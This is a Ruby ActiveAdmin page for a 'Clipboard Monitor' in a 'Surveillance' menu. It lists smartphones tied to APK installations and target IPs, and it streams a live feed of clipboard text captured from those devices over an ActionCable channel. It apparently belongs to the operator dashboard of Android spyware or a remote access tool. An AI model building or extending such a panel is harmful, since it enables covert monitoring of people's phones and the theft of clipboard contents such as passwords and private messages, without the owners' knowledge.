ActiveAdmin.register_page "Clipboard Monitor" do
  menu parent: "👁 Surveillance", priority: 8, label: "📋 Clipboard"

  content do
    div class: "clipboard-monitor" do
      h2 "📋 Clipboard Monitor", style: "color: #00ff41; margin-bottom: 20px;"

      # Device selector
      smartphones = Smartphone.all
      div class: "device-selector", style: "margin-bottom: 20px;" do
        label "📱 Device: ", style: "color: #b0bec5; margin-right: 10px;"
        select id: "clipboard-device-select", style: "padding: 8px 12px; background: #1a1a2e; color: #e0e0e0; border: 1px solid #00ff41; border-radius: 4px;" do
          smartphones.each do |s|
            option s.name || "Device #{s.id}", value: s.apk_installation&.target_ip || s.id
          end
        end
      end

      # Live feed
      div class: "clipboard-live-feed", style: "background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 20px; min-height: 400px;" do
        h3 "🔴 Live Clipboard Feed", style: "color: #ff6b6b;"
        div id: "clipboard-entries", style: "font-family: 'Courier New', monospace; font-size: 13px;" do
          para "Waiting for clipboard data...", style: "color: #666; font-style: italic;"
        end
      end

      # History section
      div style: "margin-top: 20px;" do
        h3 "📜 Clipboard History", style: "color: #00ff41;"
        div id: "clipboard-history", style: "background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 20px;" do
          para "Select a device to load history.", style: "color: #666;"
        end
      end
    end

    script do
      raw <<-JS
        $(document).ready(function() {
          var $entries = $('#clipboard-entries');
          var $history = $('#clipboard-history');
          var maxEntries = 100;

          // ActionCable subscription for live updates
          if (typeof App !== 'undefined' && App.cable) {
            App.cable.subscriptions.create("ClipboardChannel", {
              received: function(data) {
                var entry = $('<div>').css({
                  'padding': '8px 12px',
                  'border-bottom': '1px solid #21262d',
                  'animation': 'fadeIn 0.3s'
                }).html(
                  '<span style="color: #00ff41;">[' + data.timestamp + ']</span> ' +
                  '<span style="color: #58a6ff;">' + (data.device_id || 'unknown') + '</span> → ' +
                  '<span style="color: #e0e0e0;">' + escapeHtml(data.text) + '</span>'
                );
                $entries.find('p').remove(); // Remove placeholder
                $entries.prepend(entry);
                if ($entries.children().length > maxEntries) {
                  $entries.children().last().remove();
                }
              }
            });
          }

          function escapeHtml(text) {
            return $('<div>').text(text).html();
          }
        });
      JS
    end

    style do
      raw <<-CSS
        .clipboard-monitor { padding: 20px; background: #161b22; min-height: 80vh; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
      CSS
    end
  end
end
